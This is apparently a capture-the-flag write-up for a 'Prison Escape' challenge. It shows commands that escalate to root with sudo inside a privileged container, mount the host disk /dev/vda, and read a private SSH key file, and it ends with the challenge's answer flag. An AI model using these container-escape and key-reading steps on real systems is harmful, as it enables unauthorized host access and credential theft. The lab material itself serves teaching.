# Prison Escape

<table class=MsoTableGrid border=1 cellspacing=0 cellpadding=0 align=left width=808>
 <tr>
  <td width=808 colspan=2 valign=top style='width:605.85pt;border:solid windowtext 1.0pt;
  padding:0in 5.4pt 0in 5.4pt'>
  <p class=MyNormalStyle><img border=0 src="../../images/blog_images/image094.png">Prison
  Escape 
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  <img
  border=0 width=27 height=25 id="Picture 43"
  src="../../images/blog_images/image039.png">Elfen
  Ring 
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  <img
  border=0 width=25 height=24 id="Picture 347"
  src="../../images/blog_images/image095.png"
  alt="A picture containing clipart&#10;&#10;Description automatically generated">Tinsel
  Upatree</p>
  </td>
 </tr>
 <tr style='height:100.6pt'>
  <td width=200 rowspan=2 valign=top style='width:150.3pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt;height:100.6pt'>
  <p class=MyNormalStyle><img border=0 width=186 height=189 id="Picture 350"
  src="../../images/blog_images/image096.png"
  alt="A picture containing timeline&#10;&#10;Description automatically generated"></p>
  </td>
  <td width=607 valign=top style='width:455.55pt;border-top:none;border-left:
  none;border-bottom:solid windowtext 1.0pt;border-right:solid windowtext 1.0pt;
  padding:0in 5.4pt 0in 5.4pt;height:100.6pt'>
  <p class=MyNormalStyle><u><img border=0 src="../../images/blog_images/image097.png"
  alt="Graphical user interface, text&#10;&#10;Description automatically generated"></u></p>
  </td>
 </tr>
 <tr style='height:39.85pt'>
  <td width=607 valign=top style='width:455.55pt;border-top:none;border-left:
  none;border-bottom:solid windowtext 1.0pt;border-right:solid windowtext 1.0pt;
  padding:0in 5.4pt 0in 5.4pt;height:39.85pt'>
  <p class=MyNormalStyle><u>Hint from Bow Ninecandle<br>
  </u>1) Were you able to mount up? If so, users' home/ directories can be a great
  place to look for secrets...<br>
  2) When users are over-privileged, they can often act as root. When
  containers have too many permissions, they can affect the host!</p>
  </td>
 </tr>
</table>


<table class=MsoTableGrid border=1 cellspacing=0 cellpadding=0 align=left width=808 style='
  margin-xxxleftxxx:6.75pt;  margin-xxxleftyyy:6.75pt'>
 <tr>
  <td width=792 valign=top style='width:593.75pt;border:solid windowtext 1.0pt;
  padding:0in 5.4pt 0in 5.4pt'>
  <p class=TableRowBold>We can escalate to root using sudo</p>
  </td>
 </tr>
 <tr>
  <td width=792 valign=top style='width:593.75pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
    ```python 
    sudo -l
    sudo -i 
    whoami
    ```
  </td>
 </tr>
 <tr>
  <td width=792 valign=top style='width:593.75pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  <p class=MsoNormal style=' margin-xxxbottom:0in;line-height:normal'>
  <img src="../../images/blog_images/image098.png"
  alt="Text&#10;&#10;Description automatically generated"></p>
  </td>
 </tr>
 <tr>
  <td width=792 valign=top style='width:593.75pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  <p class=TableRowBold>The container is running in privileged mode. So we can run
  the below to list disk partitions on the host.</p>
  </td>
 </tr>
 <tr>
  <td width=792 valign=top style='width:593.75pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  ```python
  fdisk -l
  ```
  </td>
 </tr>
 <tr>
  <td width=792 valign=top style='width:593.75pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  <p class=MsoNormal style=' margin-xxxbottom:0in;line-height:normal'><img
  border=0 id="Picture 354"
  src="../../images/blog_images/image099.png"
  alt="Text&#10;&#10;Description automatically generated"></p>
  </td>
 </tr>
 <tr>
  <td width=792 valign=top style='width:593.75pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  <p class=MsoNormal style=' margin-xxxbottom:0in;line-height:normal'>&nbsp;</p>
  </td>
 </tr>
 <tr>
  <td width=792 valign=top style='width:593.75pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  <p class=TableRowBold style=' margin-xxxbottom:0in;line-height:normal'><b><span
  style='font-family:"Cambria",serif'>Make a folder under /mnt and mount
  /dev/vda to it</span></b></p>
  </td>
 </tr>
 <tr>
  <td width=792 valign=top style='width:593.75pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  ```python
  mkdir /mnt/host_drive
  mount /dev/vda /mnt/host_drive
  ```
  </td>
 </tr>
 <tr>
  <td width=792 valign=top style='width:593.75pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  <p class=MyCodeStyle><img border=0 width=487 height=32 id="Picture 355"
  src="../../images/blog_images/image100.png"></p>
  </td>
 </tr>
</table>

<table class=MsoTableGrid border=1 cellspacing=0 cellpadding=0 align=left width=808 style='
  margin-xxxleftxxx:6.75pt;  margin-xxxleftyyy:6.75pt'>
 <tr>
  <td width=792 valign=top style='width:593.75pt;border:solid windowtext 1.0pt;
  padding:0in 5.4pt 0in 5.4pt'>
  <p class=TableRowBold><b>The
  host partition is mounted successfully, and we can see the file jail.key.priv
  in the /home/jailer/.ssh directory </b></p>
  </td>
 </tr>
 <tr>
  <td width=792 valign=top style='width:593.75pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  ```python
  ls /mnt/host_drive/home -lR -lah
  ```
  </td>
 </tr>
</table>


<table class=MsoTableGrid border=1 cellspacing=0 cellpadding=0 align=left width=808 style='
  margin-xxxleftxxx:6.75pt;  margin-xxxleftyyy:6.75pt'>
 <tr>
  <td width=793 valign=top style='width:594.5pt;border:solid windowtext 1.0pt;
  padding:0in 5.4pt 0in 5.4pt'>
  <img
  border=0 
  src="../../images/blog_images/image101.png">
  </td>
 </tr>
 <tr>
  <td width=793 valign=top style='width:594.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  <p class=TableRowBold>Read the contents of the file jail.key.priv.</p>
  </td>
 </tr>
 <tr>
  <td width=793 valign=top style='width:594.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  <p class=MyCodeStyle>cat /mnt/host_drive/home/jailer/ssh/jail.key.priv</p>
  </td>
 </tr>
 <tr>
  <td width=793 valign=top style='width:594.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  <p class=MsoNormal style=' margin-xxxbottom:0in;line-height:normal'><img src="../../images/blog_images/image102.png"
  alt="Text&#10;&#10;Description automatically generated"></p>
  </td>
 </tr>
 <tr>
  <td width=793 valign=top style='width:594.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  <p class=TableRowBold>Answer : 082bb339ec19de4935867</p>
  </td>
 </tr>
 <tr>
  <td width=793 valign=top style='width:594.5pt;border:solid windowtext 1.0pt;
  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
  <p class=TableRowBold>The objective is now completed <br>
  and we get 25 coins as well<br>
  <img border=0 width=347 height=60 id="Picture 13"
  src="../../images/blog_images/image103.png"><img
  border=0 width=323 height=60 id="Picture 14"
  src="../../images/blog_images/image104.png"></p>
  </td>
 </tr>
</table>